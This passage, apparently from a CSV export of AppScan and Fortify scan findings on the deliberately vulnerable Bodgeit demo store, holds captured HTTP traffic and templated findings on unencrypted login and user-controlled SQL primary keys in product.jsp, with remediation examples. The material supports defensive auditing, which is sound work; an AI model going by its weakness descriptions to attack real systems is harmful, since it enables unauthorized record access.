href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Register</h3> <p style=""color:red"">You must supply a username of at least 5 characters.</p><br/> Please enter the following details to register with us: <br/><br/> <form method=""POST""> <center> <table> <tr> <td>Username (your email address):</td> <td><input id=""username"" name=""username""></input></td> </tr> <tr> <td>Password:</td> <td><input id=""password1"" name=""password1"" type=""password""></input></td> </tr> <tr> <td>Confirm Password:</td> <td><input id=""password2"" name=""password2"" type=""password""></input></td> </tr> <tr> <td></td> <td><input id=""submit"" type=""submit"" value=""Register""></input></td> </tr> </table> </center> </form> </td> </tr> </table> </td> </tr> </table> </center> </body> </html> GET /bodgeit/js/util.js HTTP/1.1 Cookie: JSESSIONID=3763D53CDAE983CDB47BA36052AD7B31 Accept-Language: en-US Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Referer: http://localhost:8080/bodgeit/ Host: localhost:8080 User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0) HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Accept-Ranges: bytes ETag: W/""1812-1343669578000"" Last-Modified: Mon, 30 Jul 2012 17:32:58 GMT Content-Type: application/javascript Content-Length: 1812 Date: Thu, 15 Oct 2015 22:20:50 GMT function loadfile(filename){ var filetype = filename.split('.').pop(); switch (filetype){ case ""js"": var insert=document.createElement('script') insert.setAttribute(""type"",""text/javascript"") insert.setAttribute(""src"", filename) break; case 'css': var insert=document.createElement(""link""); insert.setAttribute(""type"", ""text/css"") insert.setAttribute(""href"", filename) insert.setAttribute(""rel"", ""stylesheet"") break; } if (typeof insert!=""undefined"") document.getElementsByTagName(""head"")[0].appendChild(insert); return false; } ////The following is from: //http://stackoverflow.com/questions/316781/how-to-build-query-string-with-javascript function form_to_params( form ) { var output = """"; var length = form.elements.length for( var i = 0; i < length; i++ ) { element = form.elements[i] if(element.tagName == 'TEXTAREA' ) { output += ""|"" + element.name + "":"" + element.va...","","AppScan identified a login request that was not sent over SSL.","<fixRecommendations> <fixRecommendation type=""General""> <text>1. Make sure that all login requests are sent encrypted to the server.</text> <text>2. Make sure that sensitive information such as:</text> <indentText> - Username</indentText> <indentText> - Password</indentText> <indentText> - Social Security number</indentText> <indentText> - Credit Card number</indentText> <indentText> - Driver's License number</indentText> <indentText> - e-mail address</indentText> <indentText> - Phone number</indentText> <indentText> - Zip code</indentText> <br></br> <text>is always sent encrypted to the server.</text> </fixRecommendation>","","",""
"DemoApps","","Bodgeit","244","Access Control: Database","","High","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/product.jsp","prodid","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","177","Access Control: Database","","High","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/product.jsp","typeid","","http://localhost/root/product.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> 